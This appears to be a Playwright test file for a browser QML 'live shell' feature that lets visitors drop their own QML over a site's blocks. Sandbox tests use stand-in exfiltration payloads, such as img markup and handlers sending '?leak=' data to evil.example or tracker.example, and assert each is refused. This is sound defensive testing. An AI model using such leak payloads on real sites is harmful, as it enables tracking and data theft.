// A live shell (docs/LJOS_WEB.md A9): a visitor drops a shell of their own
// over a site's blocks. The page is tests/drop.html, a site built with
// `liveShell` whose own shell is scenes/drop/Shell.qml.
import { expect, test } from "./open.js";

async function opened(page) {
  await page.goto("/drop.html");
  await page.waitForFunction(() => window.ready);
  await page.evaluate(() => {
    const search = (from, name) => {
      const queue = [...(from.children ?? [])];
      while (queue.length) {
        const at = queue.shift();
        if (at.objectName === name) return at;
        queue.push(...(at.children ?? []));
      }
      return null;
    };
    window.named = (name) => (window.scene.objectName === name ? window.scene : search(window.scene, name));
  });
}

const read = (page, name, property) => page.evaluate(([name, property]) => window.named(name)?.[property], [name, property]);

async function dropped(page, text) {
  await page.evaluate((text) => window.live.drop(text), text);
  await page.evaluate(() => window.flush());
}

const errors = (page) => page.getByRole("alert");

// Reset reloads the page: what is asked of it after that is of the next one.
async function resetting(page) {
  await Promise.all([page.waitForEvent("load"), page.getByRole("button", { name: "Reset" }).first().click()]);
  await opened(page);
}

// A shell of the visitor's over the site's one block. Its root is of the
// site's root's type: one of another type is a new tree (reload.js), whose
// plain items start anew while the blocks keep theirs.
const MINE = `import QtQuick
import Shop

Column {
    objectName: "mine"
    Rectangle { id: swatch; objectName: "swatch"; width: 40; height: 20; color: "red" }
    Basket { id: basket; objectName: "basket"; onAdded: (count) => label.said = count }
    Text { id: label; objectName: "label"; property int said: 0; text: "Mine " + basket.count + " " + said }
}
`;

const over = (body) => `import QtQuick
import Shop

Column {
    Basket { id: basket; objectName: "basket" }
${body}
}
`;

test.describe("A visitor drops a shell of their own", () => {
  test.beforeEach(({ page }) => page.addInitScript(() => localStorage.clear()));

  test("A dropped shell is shown and keeps the blocks' state", async ({ page }) => {
    await opened(page);
    expect(await read(page, "label", "text")).toBe("Default 0");
    await page.evaluate(() => {
      window.before = window.named("basket");
      window.before.add();
      window.before.add();
      window.named("swatch").color = "blue";
      window.blue = String(window.named("swatch").color);
    });
    await dropped(page, MINE);
    await expect(errors(page)).toBeHidden();
    expect(await read(page, "mine", "objectName")).toBe("mine");
    // The block is the one the site's shell showed, with what was bought.
    expect(await page.evaluate(() => window.named("basket") === window.before)).toBe(true);
    expect(await read(page, "label", "text")).toBe("Mine 2 0");
    // A plain item by the same id keeps what the visitor gave it.
    expect(await page.evaluate(() => String(window.named("swatch").color) === window.blue)).toBe(true);
    // The shell's handler hears the block's event.
    await page.evaluate(() => window.named("basket").add());
    await page.evaluate(() => window.flush());
    expect(await read(page, "label", "text")).toBe("Mine 3 3");
    expect(await page.locator("#scene").textContent()).toContain("Mine 3 3");
  });

  test("A shell is opened from a file with the keyboard", async ({ page }) => {
    await opened(page);
    const open = page.getByRole("button", { name: "Open a shell…" });
    // A listener is what turns Playwright's interception on, and nothing waits for
    // that: pressed too soon, Enter reaches the input and opens a chooser nobody
    // hears. The round trips below let it arrive first.
    const listening = () => {};
    page.on("filechooser", listening);
    await open.focus();
    await expect(open).toBeFocused();
    await page.evaluate(() => {
      window.seen = [];
      for (const kind of ["keydown", "keyup", "click"])
        document.addEventListener(
          kind,
          (event) =>
            window.seen.push(
              `${kind} on ${event.target.tagName} ${event.target.type ?? ""}, active ${navigator.userActivation.isActive}`,
            ),
          true,
        );
    });
    // Shorter than the test's own limit, so that the next time it says what the page saw.
    const chooser = page.waitForEvent("filechooser", { timeout: 20000 }).catch(async (error) => {
      const seen = await page.evaluate(() => [window.seen, document.activeElement?.tagName, document.hasFocus()]);
      throw new Error(`${error.message}; the page saw ${JSON.stringify(seen)}`);
    });
    await page.keyboard.press("Enter");
    await (await chooser).setFiles({ name: "Mine.qml", mimeType: "text/plain", buffer: Buffer.from(MINE) });
    page.off("filechooser", listening);
    await expect(page.getByRole("status")).toHaveText("Your shell is shown");
    expect(await read(page, "mine", "objectName")).toBe("mine");
  });

  test("A shell is dropped on the page", async ({ page }) => {
    await opened(page);
    const transfer = await page.evaluateHandle((text) => {
      const transfer = new DataTransfer();
      transfer.items.add(new File([text], "Mine.qml", { type: "text/plain" }));
      return transfer;
    }, MINE);
    const region = page.getByRole("region", { name: "Shell" });
    await region.dispatchEvent("dragover", { dataTransfer: transfer });
    await region.dispatchEvent("drop", { dataTransfer: transfer });
    await expect(page.getByRole("status")).toHaveText("Your shell is shown");
    expect(await read(page, "mine", "objectName")).toBe("mine");
  });

  test("A broken shell says where it is broken and the page keeps running", async ({ page }) => {
    await opened(page);
    await page.evaluate(() => window.named("basket").add());
    await dropped(page, "import QtQuick\n\nColumn {\n    Text { text: ( }\n}\n");
    await expect(errors(page)).toBeVisible();
    await expect(errors(page)).toHaveText(/^Shell\.qml:4:\d+: /);
    // The site's shell is still shown, and still runs.
    expect(await read(page, "label", "text")).toBe("Default 1");
    await page.evaluate(() => window.named("basket").add());
    await page.evaluate(() => window.flush());
    expect(await read(page, "label", "text")).toBe("Default 2");
    // A shell that compiles takes the error away.
    await dropped(page, MINE);
    await expect(errors(page)).toBeHidden();
  });
});

test.describe("A block is its module's", () => {
  test.beforeEach(({ page }) => page.addInitScript(() => localStorage.clear()));

  // Shell.qml's Shop Basket and Later.qml's Cart Basket share a name and
  // an id; each is held apart all the same.
  test("A block of a name and id another module's block has is its own", async ({ page }) => {
    await opened(page);
    expect(await read(page, "later", "kind")).toBe("set aside");
    expect(await read(page, "later", "count")).toBeUndefined();
    expect(await read(page, "basket", "count")).toBe(0);
  });
});

test.describe("A shell names only what is in its scope", () => {
  test.beforeEach(({ page }) => page.addInitScript(() => localStorage.clear()));

  const refusals = [
    ["a page global", over(`    Text { text: window.location.href }`), /^Shell\.qml:6:\d+: `window` is not in a shell's scope/],
    ["eval", over(`    Text { text: eval("1") }`), /^Shell\.qml:6:\d+: `eval` is not in a shell's scope/],
    [
      "a Qt function that reaches out",
      over(`    MouseArea { onClicked: Qt.openUrlExternally("https://example.com") }`),
      /^Shell\.qml:6:\d+: `Qt\.openUrlExternally` is not in a shell's scope/,
    ],
    ["a member by a string", over(`    Text { text: basket["constructor"] }`), /^Shell\.qml:6:\d+: .*not by a string/],
    [
      "a URL the shell names for an image",
      over(`    Image { source: "https://tracker.example/pixel.png" }`),
      /^Shell\.qml:6:\d+: Image\.source takes only a URL a block gives/,
    ],
    [
      "a URL through a local named as a block is",
      over(`    Item { id: mine; property string cover: "https://tracker.example/pixel.png" }\n    Image { id: pic }\n    MouseArea { onClicked: { let basket = mine; pic.source = basket.cover } }`),
      /^Shell\.qml:8:\d+: Image\.source takes only a URL a block gives/,
    ],
    [
      "a member of its own over an image's source",
      over(`    Image { property string source: "https://tracker.example/pixel.png" }`),
      /^Shell\.qml:6:\d+: a shell declares nothing over Image's own `source`/,
    ],
    [
      "a URL the shell adds to an image's",
      over(`    Image { id: pic }\n    MouseArea { onClicked: pic.source += "https://tracker.example/pixel.png" }`),
      /^Shell\.qml:7:\d+: Image\.source takes only a URL a block gives/,
    ],
    [
      "an import beyond QtQuick and the blocks",
      "import QtQuick\nimport QtQuick.Controls\nimport Shop\n\nColumn {}\n",
      /^Shell\.qml:2:\d+: a shell may import only `QtQuick`, `Shop`, not `QtQuick\.Controls`/,
    ],
  ];
  for (const [what, text, said] of refusals) {
    test(`A shell that names ${what} is refused where it does`, async ({ page }) => {
      await opened(page);
      await dropped(page, text);
      await expect(errors(page)).toHaveText(said);
      expect(await read(page, "label", "text")).toBe("Default 0");
      expect(await page.evaluate(() => localStorage.length)).toBe(0);
    });
  }

  test("A URL a block gives is one a shell may show", async ({ page }) => {
    await opened(page);
    await dropped(page, over(`    Image { objectName: "cover"; source: basket.cover }`));
    await expect(errors(page)).toBeHidden();
    expect(await page.evaluate(() => String(window.named("cover").source) === String(window.named("basket").cover))).toBe(true);
  });
});

test.describe("A binding that runs away", () => {
  test.use({ told: [/Shell\.qml:6:\d+: the binding of text ran past its budget of 100000 steps and was stopped/] });
  test.beforeEach(({ page }) => page.addInitScript(() => localStorage.clear()));

  test("A runaway binding is stopped and warned of", async ({ page }) => {
    const warned = [];
    page.on("console", (message) => message.type() === "warning" && warned.push(message.text()));
    await opened(page);
    await dropped(page, over(`    Text { objectName: "label"; text: { var n = 0; while (true) { n = n + 1 } return n } }`));
    await expect(errors(page)).toBeHidden();
    expect(warned.some((line) => /Shell\.qml:6:\d+: the binding of text ran past its budget/.test(line))).toBe(true);
    // The page still runs.
    await page.evaluate(() => window.named("basket").add());
    await page.evaluate(() => window.flush());
    expect(await read(page, "basket", "count")).toBe(1);
  });
});

test.describe("A shell's text names no URL, however it reaches a text", () => {
  test.beforeEach(({ page }) => page.addInitScript(() => localStorage.clear()));
  const EVIL = "https://evil.example/x.png";
  const fetched = (page) => {
    const asked = [];
    page.on("request", (request) => request.url().startsWith("https://evil.example") && asked.push(request.url()));
    return asked;
  };
  const pictures = (page, name) => page.evaluate((name) => [...window.named(name).$node.querySelectorAll("img")].filter((image) => image.hasAttribute("src")).length, name);

  for (const [what, line, name] of [
    ["given to a block that is a Text", `    Title { objectName: "given"; text: "<img src='${EVIL}'>" }`, "given"],
    ["bound with a block's state", `    Title { objectName: "given"; text: "<img src='${EVIL}?" + basket.count + "'>" }`, "given"],
    ["passed on by a block to its own Text", `    Headline { objectName: "given"; title: "<img src='${EVIL}'>" }`, "given"],
  ]) {
    test(`Markup ${what} fetches nothing`, async ({ page }) => {
      const asked = fetched(page);
      await opened(page);
      await dropped(page, over(line));
      await expect(errors(page)).toBeHidden();
      await page.waitForTimeout(100);
      expect(asked).toEqual([]);
      expect(await pictures(page, name)).toBe(0);
    });
  }

  test("Markup a handler writes to a block fetches nothing", async ({ page }) => {
    const asked = fetched(page);
    await opened(page);
    await dropped(page, over(`    Title { id: told; objectName: "given" }\n    MouseArea { objectName: "tap"; width: 10; height: 10; onClicked: told.text = "<img src='${EVIL}'>" }`));
    await page.evaluate(() => {
      window.named("tap").clicked({ x: 0, y: 0 });
      window.flush();
    });
    await page.waitForTimeout(100);
    expect(await read(page, "given", "text")).toContain("evil.example");
    expect(asked).toEqual([]);
    expect(await pictures(page, "given")).toBe(0);
  });

  test("A link a shell's markup names is no link", async ({ page }) => {
    await opened(page);
    await dropped(page, over(`    Title { objectName: "given"; text: "<a href='${EVIL}'>go</a>" }`));
    expect(await page.evaluate(() => window.named("given").$node.querySelectorAll("[data-link]").length)).toBe(0);
  });

  test("The site's own markup has its pictures again when its shell is back", async ({ page }) => {
    await opened(page);
    expect(await pictures(page, "note")).toBe(1);
    await dropped(page, over('    Note { objectName: "note" }'));
    await expect.poll(() => pictures(page, "note")).toBe(0);
    await resetting(page);
    await expect.poll(() => pictures(page, "note")).toBe(1);
  });

  test("A shell refused over the site's leaves the site's markup its pictures", async ({ page }) => {
    await opened(page);
    await dropped(page, "import QtQuick\nColumn { NoSuchThing {} }\n");
    await expect(errors(page)).toBeVisible();
    expect(await pictures(page, "note")).toBe(1);
  });
});

test.describe("Each use of a block is its own", () => {
  test.beforeEach(({ page }) => page.addInitScript(() => localStorage.clear()));
  const cards = (page) =>
    page.evaluate(() => {
      const found = new Set();
      const walk = (from) => {
        for (const child of from.children ?? []) {
          if (child.objectName === "card") found.add(child);
          walk(child);
        }
      };
      walk(window.scene);
      return [...found].map((card) => card.hits);
    });

  test("A site's unnamed uses and a Repeater's delegates stay apart", async ({ page }) => {
    await opened(page);
    expect(await cards(page)).toHaveLength(4);
    const delegates = await page.evaluate(() => {
      const repeater = window.named("cards").children.find((child) => child.itemAt);
      const [first, second] = [repeater.itemAt(0), repeater.itemAt(1)];
      return { apart: first !== second, named: first.objectName, shown: first.$node.isConnected, below: second.y > first.y };
    });
    expect(delegates).toEqual({ apart: true, named: "card", shown: true, below: true });
  });

  test("Unnamed uses in a dropped shell stay apart, and keep what each held", async ({ page }) => {
    await opened(page);
    const shell = `import QtQuick
import Shop

Column {
    objectName: "mine"
    Card { id: first }
    Card { id: second }
    Card {}
    Card {}
    MouseArea { objectName: "tap"; onClicked: { first.hit(); second.hit(); second.hit() } }
}
`;
    await dropped(page, shell);
    expect(await cards(page)).toHaveLength(4);
    await page.evaluate(() => {
      window.named("tap").clicked({ x: 0, y: 0 });
      window.flush();
    });
    const hits = await cards(page);
    expect(hits.toSorted()).toEqual([0, 0, 1, 2]);
    await dropped(page, shell);
    expect((await cards(page)).toSorted()).toEqual([0, 0, 1, 2]);
  });
});

test.describe("A use of a block says more than what it sets", () => {
  test.beforeEach(({ page }) => page.addInitScript(() => localStorage.clear()));

  const USE = `import QtQuick
import Shop

Column {
    objectName: "mine"
    Panel {
        id: panel
        objectName: "panel"
        property int extra: 5
        property string heard: ""
        onExtraChanged: heard = "extra " + extra
        Text { id: words; objectName: "words"; text: "dropped " + panel.extra }
    }
    MouseArea { objectName: "tap"; onClicked: panel.extra = panel.extra + 1 }
}
`;

  test("The site's own use has its children, properties, signals, aliases, functions and attached ones", async ({ page }) => {
    await opened(page);
    const seen = await page.evaluate(() => {
      const panel = window.named("panel");
      const words = window.named("words");
      panel.pinged("hello");
      window.flush();
      return {
        words: words?.text,
        shown: words?.$node.isConnected,
        within: panel.$node.contains(words?.$node),
        extra: panel.extra,
        twice: panel.twice?.(),
        said: panel.said,
        heard: panel.heard,
        wide: panel.width,
      };
    });
    expect(seen).toEqual({ words: "extra 4 in inner", shown: true, within: true, extra: 4, twice: 8, said: "extra 4 in inner", heard: "hello", wide: 77 });
  });

  test("A dropped shell's use has its children and properties, gone with the shell", async ({ page }) => {
    await opened(page);
    await dropped(page, USE);
    await expect(errors(page)).toBeHidden();
    expect(await read(page, "words", "text")).toBe("dropped 5");
    await page.evaluate(() => {
      window.named("tap").clicked({ x: 0, y: 0 });
      window.flush();
    });
    expect(await read(page, "words", "text")).toBe("dropped 6");
    expect(await read(page, "panel", "heard")).toBe("extra 6");
    expect(await page.evaluate(() => window.named("panel").$node.contains(window.named("words").$node))).toBe(true);
    await dropped(page, over('    Panel { id: panel; objectName: "panel" }'));
    expect(await page.evaluate(() => ({ words: window.named("words"), extra: window.named("panel").extra, text: window.named("panel").$node.textContent }))).toEqual({
      words: null,
      text: "",
    });
  });

  test("The block keeps its state under the uses that come and go", async ({ page }) => {
    await opened(page);
    await dropped(page, USE);
    await page.evaluate(() => (window.named("panel").opened = 7));
    await dropped(page, USE.replace("dropped ", "again "));
    expect(await read(page, "panel", "opened")).toBe(7);
    expect(await read(page, "words", "text")).toBe("again 5");
  });

  test("Uses inside a use that is the shell's root stay apart", async ({ page }) => {
    await opened(page);
    await dropped(page, 'import QtQuick\nimport Shop\n\nPanel {\n    objectName: "panel"\n    Card { objectName: "one" }\n    Card { objectName: "one" }\n    Card { objectName: "two" }\n}\n');
    await expect(errors(page)).toBeHidden();
    expect(await page.evaluate(() => ({ shown: window.scene.$node.isConnected, uses: new Set(window.named("inner").children).size }))).toEqual({ shown: true, uses: 3 });
    await resetting(page);
    expect(await read(page, "shell", "objectName")).toBe("shell");
  });

  // A reload makes the new root before the old one goes: what the old use
  // takes off as it goes must be its own.
  const KEYED = (more) => over(`    Panel { id: panel; objectName: "panel"; focus: true; property string key: ""; ${more} }`);
  const pressed = async (page) => {
    // The Reset button a test clicked has the browser's focus, as it would.
    await page.evaluate(() => {
      document.activeElement?.blur();
      window.named("panel").forceActiveFocus();
    });
    await page.keyboard.press("a");
    return read(page, "panel", "key");
  };
  const laidAgain = (page) =>
    page.evaluate(() => {
      window.named("beside").implicitWidth += 1;
      window.flush();
      const panel = window.named("panel");
      return [panel.width, panel.height];
    });

  test("The site's own Keys handler runs, once, whenever its shell is shown again", async ({ page }) => {
    await opened(page);
    expect(await pressed(page)).toBe("a");
    // One press adds one, however many shells have been shown.
    await dropped(page, over(""));
    await resetting(page);
    expect(await read(page, "panel", "key")).toBe("");
    expect(await pressed(page)).toBe("a");
  });

  test("A shell that says nothing of Keys has none of the site's", async ({ page }) => {
    await opened(page);
    expect(await pressed(page)).toBe("a");
    await dropped(page, KEYED(""));
    await page.evaluate(() => (window.named("panel").key = "mine"));
    expect(await pressed(page)).toBe("mine");
  });

  test("The site's own shell shown again keeps its use's attached properties", async ({ page }) => {
    await opened(page);
    expect(await laidAgain(page)).toEqual([77, 44]);
    await dropped(page, over(""));
    await resetting(page);
    expect(await laidAgain(page)).toEqual([77, 44]);
  });

  test("A save of the site's shell, made before the old one goes, keeps what its use attached", async ({ page }) => {
    await opened(page);
    expect(await pressed(page)).toBe("a");
    await page.evaluate(() => window.saved());
    expect(await laidAgain(page)).toEqual([77, 44]);
    expect(await pressed(page)).toBe("aa");
  });

  test("A save that says less of a use takes off what it no longer says", async ({ page }) => {
    await opened(page);
    expect(await laidAgain(page)).toEqual([77, 44]);
    await page.evaluate(() => window.saved(true));
    // 33 is what the block's own file says.
    expect(await laidAgain(page)).toEqual([88, 33]);
  });

  test("What a use attached is taken off for what the block's own file says", async ({ page }) => {
    await opened(page);
    const said = () => page.evaluate(() => window.named("panel").$props.Layout$preferredHeight);
    expect(await said()).toBe(44);
    await dropped(page, over('    Panel { id: panel; objectName: "panel" }'));
    expect(await said()).toBe(33);
  });

  test("A shell whose root is the block the last one's root was shows it", async ({ page }) => {
    await opened(page);
    const shell = 'import QtQuick\nimport Shop\n\nPanel { objectName: "panel" }\n';
    await dropped(page, shell);
    await dropped(page, shell);
    await expect(errors(page)).toBeHidden();
    expect(await page.evaluate(() => window.scene.$node.isConnected)).toBe(true);
  });

  test("A plain item written inside a use is carried as any other is", async ({ page }) => {
    await opened(page);
    const shell = `import QtQuick
import Shop

Column {
    Panel { objectName: "panel"; Rectangle { objectName: "kid"; width: 5; height: 5; color: "red" } }
}
`;
    await dropped(page, shell);
    await page.evaluate(() => (window.named("kid").width = 9));
    await dropped(page, shell);
    expect(await read(page, "kid", "width")).toBe(9);
  });

  test("What the instance declares for one use is gone for the next", async ({ page }) => {
    await opened(page);
    await dropped(page, USE);
    expect(await read(page, "panel", "extra")).toBe(5);
    await dropped(page, over('    Panel { id: panel; objectName: "panel"; property int other: 2 }'));
    expect(await read(page, "panel", "extra")).toBeUndefined();
    expect(await read(page, "panel", "other")).toBe(2);
  });

  test("A block's use inside another's children is the shell's, and keeps its state", async ({ page }) => {
    await opened(page);
    const inside = `import QtQuick
import Shop

Column {
    Panel { objectName: "panel"; Card { objectName: "nested" } }
}
`;
    await dropped(page, inside);
    await page.evaluate(() => {
      window.nested = window.named("nested");
      window.nested.hit();
    });
    await dropped(page, inside);
    expect(await read(page, "nested", "hits")).toBe(1);
    expect(await page.evaluate(() => window.named("nested") === window.nested)).toBe(true);
  });
});

test.describe("A block's uses that come and go are made anew", () => {
  test.beforeEach(({ page }) => page.addInitScript(() => localStorage.clear()));

  test("A row that comes back starts anew", async ({ page }) => {
    await opened(page);
    const seen = await page.evaluate(() => {
      const rows = window.named("rows");
      const repeater = rows.children.find((child) => child.itemAt);
      const before = [repeater.itemAt(0), repeater.itemAt(1)];
      before[0].hit();
      const completed = rows.completed;
      rows.many = 0;
      window.flush();
      const gone = repeater.count;
      const left = before[0].$node.isConnected;
      rows.many = 2;
      window.flush();
      const again = repeater.itemAt(0);
      return { completed, gone, left, fresh: again !== before[0], hits: again.hits, more: rows.completed };
    });
    expect(seen).toEqual({ completed: 2, gone: 0, left: false, fresh: true, hits: 0, more: 4 });
  });

  test("What a program makes is its own, and is gone when destroyed", async ({ page }) => {
    await opened(page);
    const seen = await page.evaluate(() => {
      const rows = window.named("rows");
      const first = rows.make(rows);
      first.hit();
      const hits = first.hits;
      const shown = first.$node.isConnected;
      const known = rows.children.includes(first);
      window.first = first;
      first.destroy();
      return { hits, shown, known };
    });
    expect(seen).toEqual({ hits: 1, shown: true, known: true });
    // `destroy` ends an object once what asked for it has returned.
    await page.waitForFunction(() => !window.first.$node.isConnected && !window.named("rows").children.includes(window.first));
    const next = await page.evaluate(() => {
      const made = window.named("rows").make(window.named("rows"));
      return { fresh: made !== window.first, hits: made.hits };
    });
    expect(next).toEqual({ fresh: true, hits: 0 });
  });

  test("Objects made with no parent do not share an instance", async ({ page }) => {
    await opened(page);
    const seen = await page.evaluate(() => {
      const rows = window.named("rows");
      const [one, two] = [rows.make(null), rows.make(null)];
      one.hit();
      return { apart: one !== two, one: one.hits, two: two.hits };
    });
    expect(seen).toEqual({ apart: true, one: 1, two: 0 });
  });
});

test.describe("While a dropped shell is shown, nothing fetches from another site", () => {
  // Once a test: what a page leaves for the next is what some of them are of.
  test.beforeEach(({ page }) =>
    page.addInitScript(() => {
      if (sessionStorage.cleared) return;
      sessionStorage.cleared = "1";
      localStorage.clear();
    }),
  );
  // Each refusal is told of, once.
  test.use({ told: [/^not (fetched|kept) while a dropped shell is shown/] });
  const EVIL = "https://evil.example/x.png";
  const GOOD = "https://cdn.example/x.png";
  const PNG = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=", "base64");
  const fetched = async (page) => {
    const asked = [];
    page.on("request", (request) => /(evil|cdn)\.example/.test(request.url()) && asked.push(request.url()));
    await page.route(/(evil|cdn)\.example/, (route) => route.fulfill({ body: PNG, contentType: "image/png", headers: { "Access-Control-Allow-Origin": "*" } }));
    return asked;
  };
  const pic = (url) => over(`    Pic { objectName: "pic"; picture: "${url}" }`);
  const statusOf = (page) => page.evaluate(() => window.named("pic").status);
  const [READY, ERROR] = [1, 3];

  test("A shell's string given to a block's Image fetches nothing, and the Image says so", async ({ page }) => {
    const asked = await fetched(page);
    await opened(page);
    await dropped(page, pic(EVIL));
    await expect(errors(page)).toBeHidden();
    await expect.poll(() => statusOf(page)).toBe(ERROR);
    expect(asked).toEqual([]);
  });

  test("A picture of the site's own still comes", async ({ page }) => {
    await opened(page);
    const own = new URL("scenes/drop/Shop/cover.svg", page.url() === "about:blank" ? "http://localhost:" + (process.env.LJOS_WEB_PORT ?? "4301") + "/" : page.url()).href;
    await dropped(page, pic(own));
    await expect.poll(() => statusOf(page)).toBe(READY);
  });

  test("A host the site allows is fetched", async ({ page }) => {
    await page.addInitScript(() => (window.allowedHosts = ["cdn.example"]));
    const asked = await fetched(page);
    await opened(page);
    await dropped(page, pic(GOOD));
    await expect.poll(() => statusOf(page)).toBe(READY);
    expect(asked).toEqual([GOOD]);
    await page.evaluate((url) => (window.named("pic").picture = url), EVIL);
    await expect.poll(() => statusOf(page)).toBe(ERROR);
    expect(asked).toEqual([GOOD]);
  });

  test("What a shell's handler wrote on a block is not fetched after Reset", async ({ page }) => {
    const asked = await fetched(page);
    await opened(page);
    await dropped(
      page,
      `import QtQuick
import Shop

Column {
    Basket { id: basket; objectName: "basket"; onAdded: (count) => pic.picture = "${EVIL}?leak=" + count }
    Pic { id: pic; objectName: "pic" }
}
`,
    );
    await expect(errors(page)).toBeHidden();
    await page.evaluate(() => window.named("basket").add());
    await expect.poll(() => statusOf(page)).toBe(ERROR);
    expect(asked).toEqual([]);
    await resetting(page);
    await page.waitForTimeout(100);
    expect(asked).toEqual([]);
  });

  test.describe("What a block keeps of a shell's string", () => {
    const KEPT = `import QtQuick
import Shop

Column {
    Basket { id: basket; objectName: "basket"; onAdded: (count) => keeps.keep("${EVIL}?leak=" + count) }
    Keeps { id: keeps; objectName: "keeps" }
}
`;
    const site = (page) =>
      page.evaluate(() => {
        const element = document.createElement("div");
        document.body.append(element);
        window.keeping = window.liveShell(window.Keeping, element, { site: "keeping" });
        return window.keeping.idle();
      });
    const part = (page, name) => page.evaluateHandle((name) => window.keeping.object.children.find((child) => child.objectName === name), name);
    const kept = async (page) => {
      await page.evaluate((text) => window.keeping.drop(text), KEPT);
      await (await part(page, "basket")).evaluate((basket) => basket.add());
    };
    const answer = (page, wait) => page.route("**/slow-answer", async (route) => (await new Promise((done) => setTimeout(done, wait)), route.fulfill({ body: "" })));

    test("Is in its state, its model, a nested object and a closure, and is refused while the shell is shown", async ({ page }) => {
      const asked = await fetched(page);
      await answer(page, 0);
      await opened(page);
      await site(page);
      await kept(page);
      const keeps = await part(page, "keeps");
      const state = () => keeps.evaluate((block) => [block.nestedAddress, block.rows, block.script[0], block.picture]);
      const leaked = `${EVIL}?leak=1`;
      await expect.poll(state).toEqual([leaked, 1, leaked, leaked]);
      await page.waitForTimeout(250);
      expect(asked).toEqual([]);
    });

    test("Is not fetched when a timer or an answer comes after Reset", async ({ page }) => {
      const asked = await fetched(page);
      await answer(page, 300);
      await opened(page);
      await site(page);
      await kept(page);
      await Promise.all([page.waitForEvent("load"), page.evaluate(() => void window.keeping.reset())]);
      await opened(page);
      await page.waitForTimeout(500);
      expect(asked).toEqual([]);
    });

    test("Is on no later page, in Settings or LocalStorage", async ({ page }) => {
      const asked = await fetched(page);
      await answer(page, 0);
      await page.goto("/drop.html");
      await page.evaluate(() => void indexedDB.deleteDatabase("ljos-web.LocalStorage"));
      await opened(page);
      await site(page);
      await kept(page);
      const keeps = await part(page, "keeps");
      // This page still reads what it was told.
      await expect.poll(() => keeps.evaluate((block) => block.fromSettings)).toContain("leak=1");
      await page.waitForTimeout(100);
      await Promise.all([page.waitForEvent("load"), page.evaluate(() => void window.keeping.reset())]);
      await opened(page);
      expect(await page.evaluate(() => JSON.stringify({ ...localStorage }))).not.toContain("evil");
      await site(page);
      await page.waitForTimeout(100);
      const next = await part(page, "keeps");
      expect(await next.evaluate((block) => [block.fromSettings, block.fromDatabase, block.rows, block.picture])).toEqual(["", "", 0, ""]);
      expect(asked).toEqual([]);
    });

    test("What the site's own shell keeps is still kept", async ({ page }) => {
      await fetched(page);
      await answer(page, 0);
      await page.goto("/drop.html");
      await page.evaluate(() => void indexedDB.deleteDatabase("ljos-web.LocalStorage"));
      await opened(page);
      await site(page);
      await (await part(page, "keeps")).evaluate((block) => block.keep("cover.svg"));
      await page.waitForTimeout(100);
      await page.reload();
      await opened(page);
      await site(page);
      const next = await part(page, "keeps");
      await expect.poll(() => next.evaluate((block) => [block.fromSettings, block.fromDatabase])).toEqual(["cover.svg", "cover.svg"]);
    });
  });

  test("A kept shell keeps a block's writes off the next page, and says so once, until Reset", async ({ page }) => {
    const warned = [];
    page.on("console", (message) => message.text().startsWith("not kept") && warned.push(message.text()));
    await fetched(page);
    await page.route("**/slow-answer", (route) => route.fulfill({ body: "" }));
    await page.goto("/drop.html");
    await page.evaluate(() => void indexedDB.deleteDatabase("ljos-web.LocalStorage"));
    const site = async () => {
      await opened(page);
      await page.evaluate(() => {
        const element = document.createElement("div");
        document.body.append(element);
        window.keeping = window.liveShell(window.Keeping, element, { site: "keeping" });
        return window.keeping.idle();
      });
    };
    const keeps = () => page.evaluateHandle(() => window.keeping.object.children.find((child) => child.objectName === "keeps"));
    const write = async (text) => {
      await (await keeps()).evaluate((block, text) => block.keep(text), text);
      await page.waitForTimeout(100);
      return page.evaluate(() => window.databasesSaved());
    };
    const found = async () => (await keeps()).evaluate((block) => [block.fromSettings, block.fromDatabase]);
    const shell = `import QtQuick\nimport Shop\n\nColumn {\n    Keeps { objectName: "keeps" }\n}\n`;

    await site();
    expect(await write("first.svg")).toBe(true);
    expect(warned).toEqual([]);
    await page.evaluate((text) => window.keeping.drop(text), shell);

    // The next visit: the shell is shown again, with no one dropping it.
    await page.reload();
    await site();
    expect(await page.evaluate(() => window.keeping.text)).toBe(shell);
    await expect.poll(found).toEqual(["first.svg", "first.svg"]);
    expect(await write("second.svg")).toBe(false);
    expect(await write("third.svg")).toBe(false);
    expect(warned.length).toBe(1);
    // This page still reads what it wrote.
    expect((await found())[0]).toBe("third.svg");

    await page.reload();
    await site();
    await expect.poll(found).toEqual(["first.svg", "first.svg"]);
    expect(await write("fourth.svg")).toBe(false);

    await Promise.all([page.waitForEvent("load"), page.evaluate(() => void window.keeping.reset())]);
    await site();
    expect(await page.evaluate(() => window.keeping.text)).toBe(null);
    await expect.poll(found).toEqual(["first.svg", "first.svg"]);
    expect(await write("fifth.svg")).toBe(true);
    await page.reload();
    await site();
    expect((await found())[0]).toBe("fifth.svg");
  });

  test("No other sink fetches what a shell names", async ({ page }) => {
    const asked = await fetched(page);
    const opens = [];
    page.on("popup", (popup) => opens.push(popup.url()));
    await opened(page);
    await dropped(page, over(`    Sinks { id: sinks; objectName: "sinks"; address: "${EVIL}" }`));
    await expect(errors(page)).toBeHidden();
    const left = await page.evaluate(() => {
      const sinks = window.named("sinks");
      sinks.ask();
      return sinks.leave();
    });
    await page.waitForTimeout(200);
    expect(asked).toEqual([]);
    expect(opens).toEqual([]);
    expect(left).toBe(false);
  });

  // What a site's shell that reaches another site is answered.
  const reached = async (page) => {
    const sockets = [];
    await page.routeWebSocket(/evil\.example/, (socket) => sockets.push(socket.url()));
    await page.route(/list\.xml/, (route) => route.fulfill({ body: "<items><item/></items>", contentType: "text/xml", headers: { "Access-Control-Allow-Origin": "*" } }));
    return sockets;
  };

  const reachingSite = (page) =>
    page.evaluate(() => {
      const element = document.createElement("div");
      document.body.append(element);
      window.reaching = window.liveShell(window.Reaches, element, { site: "reaches" });
    });

  test("What the site's shell fetches as it is made, after a Reset, it fetches", async ({ page }) => {
    const asked = await fetched(page);
    const sockets = await reached(page);
    await opened(page);
    const reaching = () => page.evaluate(() => {
      const reaches = window.reaching.object;
      return { model: reaches.loaded, xhr: reaches.answer, socket: reaches.socketStatus };
    });
    await reachingSite(page);
    await expect.poll(() => asked.length).toBe(2);
    await expect.poll(() => sockets.length).toBe(1);
    await page.evaluate((text) => window.reaching.drop(text), over(""));
    await page.waitForTimeout(100);
    expect(asked.length).toBe(2);
    expect(sockets.length).toBe(1);
    await Promise.all([page.waitForEvent("load"), page.evaluate(() => void window.reaching.reset())]);
    await opened(page);
    await reachingSite(page);
    await expect.poll(() => asked.length).toBe(4);
    await expect.poll(() => sockets.length).toBe(2);
    // Once each, and answered: nothing was refused on the way and asked again.
